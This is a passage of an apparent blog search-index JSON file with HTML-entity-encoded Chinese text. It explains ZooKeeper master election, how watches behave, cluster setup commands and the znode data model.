;&#x5F97;&#x6700;&#x65B0;&#x5217;&#x8868;&#x5373;&#x53EF;&#x3002; &#x53E6;&#x5916;&#x6709;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5C31;&#x662F;&#x96C6;&#x7FA4;&#x9009;master,&#x4E00;&#x65E6;master&#x6302;&#x6389;&#x80FD;&#x591F;&#x9A6C;&#x4E0A;&#x80FD;&#x4ECE;slave&#x4E2D;&#x9009;&#x51FA;&#x4E00;&#x4E2A;master,&#x5B9E;&#x73B0;&#x6B65;&#x9AA4;&#x548C;&#x524D;&#x8005;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x662F;&#x673A;&#x5668;&#x5728;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x5728;APP1SERVERS&#x521B;&#x5EFA;&#x7684;&#x8282;&#x70B9;&#x7C7B;&#x578B;&#x53D8;&#x4E3A;EPHEMERAL_SEQUENTIAL&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x4F1A;&#x81EA;&#x52A8;&#x88AB;&#x7F16;&#x53F7; &#x6211;&#x4EEC;&#x9ED8;&#x8BA4;&#x89C4;&#x5B9A;&#x7F16;&#x53F7;&#x6700;&#x5C0F;&#x7684;&#x4E3A;master,&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x5BF9;/APP1SERVERS&#x8282;&#x70B9;&#x505A;&#x76D1;&#x63A7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F97;&#x5230;&#x670D;&#x52A1;&#x5668;&#x5217;&#x8868;&#xFF0C;&#x53EA;&#x8981;&#x6240;&#x6709;&#x96C6;&#x7FA4;&#x673A;&#x5668;&#x903B;&#x8F91;&#x8BA4;&#x4E3A;&#x6700;&#x5C0F;&#x7F16;&#x53F7;&#x8282;&#x70B9;&#x4E3A;master&#xFF0C;&#x90A3;&#x4E48;master&#x5C31;&#x88AB;&#x9009;&#x51FA;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;master&#x5B95;&#x673A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x76F8;&#x5E94;&#x7684;znode&#x4F1A;&#x6D88;&#x5931;&#xFF0C;&#x7136;&#x540E;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5217;&#x8868;&#x5C31;&#x88AB;&#x63A8;&#x9001;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x903B;&#x8F91;&#x8BA4;&#x4E3A;&#x6700;&#x5C0F;&#x7F16;&#x53F7;&#x8282;&#x70B9;&#x4E3A;master&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x505A;&#x5230;&#x52A8;&#x6001;master&#x9009;&#x4E3E;&#x3002; Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;Zookeeper C API &#x7684;&#x58F0;&#x660E;&#x548C;&#x63CF;&#x8FF0;&#x5728; include/zookeeper.h &#x4E2D;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#xFF0C;&#x53E6;&#x5916;&#x5927;&#x90E8;&#x5206;&#x7684; Zookeeper C API &#x5E38;&#x91CF;&#x3001;&#x7ED3;&#x6784;&#x4F53;&#x58F0;&#x660E;&#x4E5F;&#x5728; zookeeper.h &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528; C API &#x662F;&#x9047;&#x5230;&#x4E0D;&#x660E;&#x767D;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6700;&#x597D;&#x770B;&#x770B; zookeeper.h&#xFF0C;&#x6216;&#x8005;&#x81EA;&#x5DF1;&#x4F7F;&#x7528; doxygen &#x751F;&#x6210; Zookeeper C API &#x7684;&#x5E2E;&#x52A9;&#x6587;&#x6863;&#x3002; Zookeeper &#x4E2D;&#x6700;&#x6709;&#x7279;&#x8272;&#x4E14;&#x6700;&#x4E0D;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x7684;&#x662F;&#x76D1;&#x89C6;(Watches)&#x3002;Zookeeper &#x6240;&#x6709;&#x7684;&#x8BFB;&#x64CD;&#x4F5C;&#x2014;&#x2014;getData(), getChildren(), &#x548C; exists() &#x90FD; &#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;(watch)&#xFF0C;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x6B21;&#x6027;&#x7684;&#x89E6;&#x53D1;&#x5668;&#xFF0C; &#x5B98;&#x65B9;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A; a watch event is one-time trigger, sent to the client that set the watch, which occurs when the data for which the watch was set changes&#x3002;&#x5BF9;&#x6B64;&#x9700;&#x8981;&#x4F5C;&#x51FA;&#x5982;&#x4E0B;&#x7406;&#x89E3;&#xFF1A; One-time trigge&#xFF08;&#x4E00;&#x6B21;&#x6027;&#x89E6;&#x53D1;&#xFF09; &#x5F53;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x8BE5;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x4F1A;&#x88AB;&#x53D1;&#x9001;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8C03;&#x7528;&#x4E86; getData(&#x201C;/znode1&#x201D;, true) &#x5E76;&#x4E14;&#x7A0D;&#x540E; /znode1 &#x8282;&#x70B9;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x4E86;&#x6539;&#x53D8;&#x6216;&#x8005;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x4F1A;&#x83B7;&#x53D6;&#x5230; /znode1 &#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x800C;&#x5982;&#x679C; /znode1 &#x518D;&#x4E00;&#x6B21;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;&#x9664;&#x975E;&#x5BA2;&#x6237;&#x7AEF;&#x518D;&#x6B21;&#x5BF9; /znode1 &#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#xFF0C;&#x5426;&#x5219;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x4F1A;&#x6536;&#x5230;&#x4E8B;&#x4EF6;&#x901A;&#x77E5;&#x3002; Sent to the client&#xFF08;&#x53D1;&#x9001;&#x81F3;&#x5BA2;&#x6237;&#x7AEF;&#xFF09; Zookeeper &#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x662F;&#x901A;&#x8FC7; socket &#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x5B58;&#x5728;&#x6545;&#x969C;&#xFF0C;&#x6240;&#x4EE5;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x6210;&#x529F;&#x5730;&#x5230;&#x8FBE;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x662F;&#x5F02;&#x6B65;&#x53D1;&#x9001;&#x81F3;&#x76D1;&#x89C6;&#x8005;&#x7684;&#xFF0C;Zookeeper &#x672C;&#x8EAB;&#x63D0;&#x4F9B;&#x4E86;&#x4FDD;&#x5E8F;&#x6027;(ordering guarantee)&#xFF1A;&#x5373;&#x5BA2;&#x6237;&#x7AEF;&#x53EA;&#x6709;&#x9996;&#x5148;&#x770B;&#x5230;&#x4E86;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x540E;&#xFF0C;&#x624D;&#x4F1A;&#x611F;&#x77E5;&#x5230;&#x5B83;&#x6240;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x7684; znode &#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;(a client will never see a change for which it has set a watch until it first sees the watch event). &#x7F51;&#x7EDC;&#x5EF6;&#x8FDF;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x56E0;&#x7D20;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4E0D;&#x540C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x523B;&#x611F;&#x77E5;&#x67D0;&#x4E00;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6240;&#x770B;&#x5230;&#x7684;&#x4E00;&#x5207;&#x5177;&#x6709;&#x4E00;&#x81F4;&#x7684;&#x987A;&#x5E8F;&#x3002; The data for which the watch was set&#xFF08;&#x88AB;&#x8BBE;&#x7F6E; watch &#x7684;&#x6570;&#x636E;&#xFF09; &#x8FD9;&#x610F;&#x5473;&#x7740; znode &#x8282;&#x70B9;&#x672C;&#x8EAB;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x6539;&#x53D8;&#x65B9;&#x5F0F;&#x3002;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x60F3;&#x8C61; Zookeeper &#x7EF4;&#x62A4;&#x4E86;&#x4E24;&#x6761;&#x76D1;&#x89C6;&#x94FE;&#x8868;&#xFF1A;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x548C;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;(data watches and child watches) getData() and exists() &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x76D1;&#x89C6;&#xFF0C;getChildren() &#x8BBE;&#x7F6E;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x3002; &#x6216;&#x8005;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x60F3;&#x8C61; Zookeeper &#x8BBE;&#x7F6E;&#x7684;&#x4E0D;&#x540C;&#x76D1;&#x89C6;&#x8FD4;&#x56DE;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#xFF0C;getData() &#x548C; exists() &#x8FD4;&#x56DE; znode &#x8282;&#x70B9;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x800C; getChildren() &#x8FD4;&#x56DE;&#x5B50;&#x8282;&#x70B9;&#x5217;&#x8868;&#x3002;&#x56E0;&#x6B64;&#xFF0C; setData() &#x4F1A;&#x89E6;&#x53D1;&#x8BBE;&#x7F6E;&#x5728;&#x67D0;&#x4E00;&#x8282;&#x70B9;&#x4E0A;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;(&#x5047;&#x5B9A;&#x6570;&#x636E;&#x8BBE;&#x7F6E;&#x6210;&#x529F;)&#xFF0C;&#x800C;&#x4E00;&#x6B21;&#x6210;&#x529F;&#x7684; create() &#x64CD;&#x4F5C;&#x5219;&#x4F1A;&#x51FA;&#x53D1;&#x5F53;&#x524D;&#x8282;&#x70B9;&#x4E0A;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7236;&#x8282;&#x70B9;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x3002;&#x4E00;&#x6B21;&#x6210;&#x529F;&#x7684; delete() &#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x89E6;&#x53D1;&#x5F53;&#x524D;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x548C;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8BE5;&#x8282;&#x70B9;&#x7236;&#x8282;&#x70B9;&#x7684;child watch&#x3002; Zookeeper &#x4E2D;&#x7684;&#x76D1;&#x89C6;&#x662F;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5BB9;&#x6613;&#x8BBE;&#x7F6E;&#x3001;&#x7EF4;&#x62A4;&#x548C;&#x5206;&#x53D1;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E; Zookeeper &#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5931;&#x53BB;&#x8054;&#x7CFB;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5E76;&#x4E0D;&#x4F1A;&#x6536;&#x5230;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x7684;&#x901A;&#x77E5;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x82E5;&#x5728;&#x5FC5;&#x8981;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4EE5;&#x524D;&#x6CE8;&#x518C;&#x7684;&#x76D1;&#x89C6;&#x4F1A;&#x91CD;&#x65B0;&#x88AB;&#x6CE8;&#x518C;&#x5E76;&#x89E6;&#x53D1;&#xFF0C;&#x5BF9;&#x4E8E;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6765;&#x8BF4; &#x8FD9;&#x901A;&#x5E38;&#x662F;&#x900F;&#x660E;&#x7684;&#x3002;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x4F1A;&#x5BFC;&#x81F4;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x7684;&#x4E22;&#x5931;&#xFF0C;&#x5373;&#xFF1A;&#x901A;&#x8FC7; exists() &#x8BBE;&#x7F6E;&#x4E86;&#x67D0;&#x4E2A; znode &#x8282;&#x70B9;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x67D0;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x6B64; znode &#x8282;&#x70B9;&#x88AB;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x4E0E; zookeeper &#x670D;&#x52A1;&#x5668;&#x5931;&#x53BB;&#x4E86;&#x8054;&#x7CFB;&#xFF0C;&#x8BE5;&#x5BA2;&#x6237;&#x7AEF;&#x5373;&#x4F7F;&#x7A0D;&#x540E;&#x91CD;&#x65B0;&#x8FDE;&#x63A5; zookeeper&#x670D;&#x52A1;&#x5668;&#x540E;&#x4E5F;&#x5F97;&#x4E0D;&#x5230;&#x4E8B;&#x4EF6;&#x901A;&#x77E5;","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"Zookeeper","slug":"Zookeeper","permalink":"http://www.wangxin123.com/tags/Zookeeper/"}]},{"title":"Zookeeper简介","slug":"Zookeeper简介","date":"2016-05-19T13:18:00.000Z","updated":"2017-01-08T12:05:24.356Z","comments":true,"path":"2016/05/19/Zookeeper简介/","link":"","permalink":"http://www.wangxin123.com/2016/05/19/Zookeeper简介/","excerpt":"&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;ZooKeeper&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#xFF0C;&#x5F00;&#x653E;&#x6E90;&#x7801;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x534F;&#x8C03;&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x539F;&#x8BED;&#x96C6;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x57FA;&#x4E8E;&#x5B83;&#x5B9E;&#x73B0;&#x540C;&#x6B65;&#x670D;&#x52A1;&#xFF0C;&#x914D;&#x7F6E;&#x7EF4;&#x62A4;&#x548C;&#x547D;&#x540D;&#x670D;&#x52A1;&#x7B49;&#x3002;Zookeeper&#x662F;hadoop&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x9879;&#x76EE;&#xFF0C;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x65E0;&#x9700;&#x8D58;&#x8FF0;&#x3002;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x5DE5;&#x7A0B;&#x5E08;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x5730;&#x4F7F;&#x7528;&#x9501;&#x673A;&#x5236;&#xFF0C;&#x4EE5;&#x53CA;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x4E0D;&#x9002;&#x5408;&#x5728;&#x67D0;&#x4E9B;&#x5E94;&#x7528;&#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x9760;&#x7684;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3001;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x6765;&#x7EDF;&#x4E00;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;Zookeeper&#x7684;&#x76EE;&#x7684;&#x5C31;&#x5728;&#x4E8E;&#x6B64;&#x3002;&#x672C;&#x6587;&#x7B80;&#x5355;&#x5206;&#x6790;zookeeper&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF0C;&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x4F7F;&#x7528;zookeeper&#x4E0D;&#x662F;&#x672C;&#x6587;&#x8BA8;&#x8BBA;&#x7684;&#x91CD;&#x70B9;&#x3002; Zookeeper&#x89D2;&#x8272;","keywords":null,"text":"&#x4EC0;&#x4E48;&#x662F;Zookeeper&#xFF1F;ZooKeeper&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#xFF0C;&#x5F00;&#x653E;&#x6E90;&#x7801;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x534F;&#x8C03;&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x539F;&#x8BED;&#x96C6;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x57FA;&#x4E8E;&#x5B83;&#x5B9E;&#x73B0;&#x540C;&#x6B65;&#x670D;&#x52A1;&#xFF0C;&#x914D;&#x7F6E;&#x7EF4;&#x62A4;&#x548C;&#x547D;&#x540D;&#x670D;&#x52A1;&#x7B49;&#x3002;Zookeeper&#x662F;hadoop&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x9879;&#x76EE;&#xFF0C;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x65E0;&#x9700;&#x8D58;&#x8FF0;&#x3002;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x5DE5;&#x7A0B;&#x5E08;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x5730;&#x4F7F;&#x7528;&#x9501;&#x673A;&#x5236;&#xFF0C;&#x4EE5;&#x53CA;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x4E0D;&#x9002;&#x5408;&#x5728;&#x67D0;&#x4E9B;&#x5E94;&#x7528;&#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x6709;&#x4E00;&#x79CD;&#x53EF;&#x9760;&#x7684;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3001;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x534F;&#x8C03;&#x673A;&#x5236;&#x6765;&#x7EDF;&#x4E00;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;Zookeeper&#x7684;&#x76EE;&#x7684;&#x5C31;&#x5728;&#x4E8E;&#x6B64;&#x3002;&#x672C;&#x6587;&#x7B80;&#x5355;&#x5206;&#x6790;zookeeper&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF0C;&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x4F7F;&#x7528;zookeeper&#x4E0D;&#x662F;&#x672C;&#x6587;&#x8BA8;&#x8BBA;&#x7684;&#x91CD;&#x70B9;&#x3002; Zookeeper&#x89D2;&#x8272; &#x7CFB;&#x7EDF;&#x6A21;&#x578B;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A; &#x8BBE;&#x8BA1;&#x76EE;&#x7684; &#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF1A;client&#x4E0D;&#x8BBA;&#x8FDE;&#x63A5;&#x5230;&#x54EA;&#x4E2A;Server&#xFF0C;&#x5C55;&#x793A;&#x7ED9;&#x5B83;&#x90FD;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x89C6;&#x56FE;&#xFF0C;&#x8FD9;&#x662F;zookeeper&#x6700;&#x91CD;&#x8981;&#x7684;&#x6027;&#x80FD;&#x3002; &#x53EF;&#x9760;&#x6027;&#xFF1A;&#x5177;&#x6709;&#x7B80;&#x5355;&#x3001;&#x5065;&#x58EE;&#x3001;&#x826F;&#x597D;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5982;&#x679C;&#x6D88;&#x606F;m&#x88AB;&#x5230;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C06;&#x88AB;&#x6240;&#x6709;&#x7684;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#x3002; &#x5B9E;&#x65F6;&#x6027;&#xFF1A;Zookeeper&#x4FDD;&#x8BC1;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5728;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x8303;&#x56F4;&#x5185;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x7684;&#x66F4;&#x65B0;&#x4FE1;&#x606F;&#xFF0C;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x5931;&#x6548;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x4F46;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x5EF6;&#x65F6;&#x7B49;&#x539F;&#x56E0;&#xFF0C;Zookeeper&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x4E24;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x540C;&#x65F6;&#x5F97;&#x5230;&#x521A;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x6700;&#x65B0;&#x6570;&#x636E;&#xFF0C;&#x5E94;&#x8BE5;&#x5728;&#x8BFB;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x8C03;&#x7528;sync()&#x63A5;&#x53E3;&#x3002; &#x7B49;&#x5F85;&#x65E0;&#x5173;&#xFF08;wait-free&#xFF09;&#xFF1A;&#x6162;&#x7684;&#x6216;&#x8005;&#x5931;&#x6548;&#x7684;client&#x4E0D;&#x5F97;&#x5E72;&#x9884;&#x5FEB;&#x901F;&#x7684;client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x4F7F;&#x5F97;&#x6BCF;&#x4E2A;client&#x90FD;&#x80FD;&#x6709;&#x6548;&#x7684;&#x7B49;&#x5F85;&#x3002; &#x539F;&#x5B50;&#x6027;&#xFF1A;&#x66F4;&#x65B0;&#x53EA;&#x80FD;&#x6210;&#x529F;&#x6216;&#x8005;&#x5931;&#x8D25;&#xFF0C;&#x6CA1;&#x6709;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#x3002; &#x987A;&#x5E8F;&#x6027;&#xFF1A;&#x5305;&#x62EC;&#x5168;&#x5C40;&#x6709;&#x5E8F;&#x548C;&#x504F;&#x5E8F;&#x4E24;&#x79CD;&#xFF1A;&#x5168;&#x5C40;&#x6709;&#x5E8F;&#x662F;&#x6307;&#x5982;&#x679C;&#x5728;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6D88;&#x606F;a&#x5728;&#x6D88;&#x606F;b&#x524D;&#x53D1;&#x5E03;&#xFF0C;&#x5219;&#x5728;&#x6240;&#x6709;Server&#x4E0A;&#x6D88;&#x606F;a&#x90FD;&#x5C06;&#x5728;&#x6D88;&#x606F;b&#x524D;&#x88AB;&#x53D1;&#x5E03;&#xFF1B;&#x504F;&#x5E8F;&#x662F;&#x6307;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6D88;&#x606F;b&#x5728;&#x6D88;&#x606F;a&#x540E;&#x88AB;&#x540C;&#x4E00;&#x4E2A;&#x53D1;&#x9001;&#x8005;&#x53D1;&#x5E03;&#xFF0C;a&#x5FC5;&#x5C06;&#x6392;&#x5728;b&#x524D;&#x9762;&#x3002; &#x5355;&#x673A;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;1&#x3001;&#x89E3;&#x538B;&#xFF1A;tar xzf zookeeper-3.4.5.tar.gz2&#x3001;&#x5728;conf&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;zoo.cfg&#xFF0C;dataDir=/usr/local/zk/data3&#x3001;&#x542F;&#x52A8;ZooKeeper&#x7684;Server&#xFF1A;sh bin/zkServer.sh start, &#x5982;&#x679C;&#x60F3;&#x8981;&#x5173;&#x95ED;&#xFF0C;&#x8F93;&#x5165;&#xFF1A;zkServer.sh stop &#x96C6;&#x7FA4;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;1&#x3001;&#x521B;&#x5EFA;myid&#x6587;&#x4EF6;&#xFF0C;server1&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;1&#xFF0C;server2&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;2&#xFF0C;server3&#x673A;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;32&#x3001;&#x5728;conf&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;zoo.cfg&#xFF0C;dataDir=/usr/local/zk/dataserver.1=server1:2888:3888server.2=server2:2888:3888server.3=server3:2888:3888 Zookeeper&#x7684;&#x6570;&#x636E;&#x6A21;&#x578B; &#x5C42;&#x6B21;&#x5316;&#x7684;&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#xFF0C;&#x547D;&#x540D;&#x7B26;&#x5408;&#x5E38;&#x89C4;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x89C4;&#x8303; &#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x5728;zookeeper&#x4E2D;&#x53EB;&#x505A;znode,&#x5E76;&#x4E14;&#x5176;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;&#x8DEF;&#x5F84;&#x6807;&#x8BC6; &#x8282;&#x70B9;Znode&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6570;&#x636E;&#x548C;&#x5B50;&#x8282;&#x70B9;&#xFF0C;&#x4F46;&#x662F;EPHEMERAL&#x7C7B;&#x578B;&#x7684;&#x8282;&#x70B9;&#x4E0D;&#x80FD;&#x6709;&#x5B50;&#x8282;&#x70B9; Znode&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982;&#x67D0;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0B;&#x5B58;&#x6709;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x7248;&#x672C;&#xFF0C;&#x90A3;&#x4E48;&#x67E5;&#x8BE2;&#x8FD9;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;&#x6570;&#x636E;&#x5C31;&#x9700;&#x8981;&#x5E26;&#x4E0A;&#x7248;&#x672C; 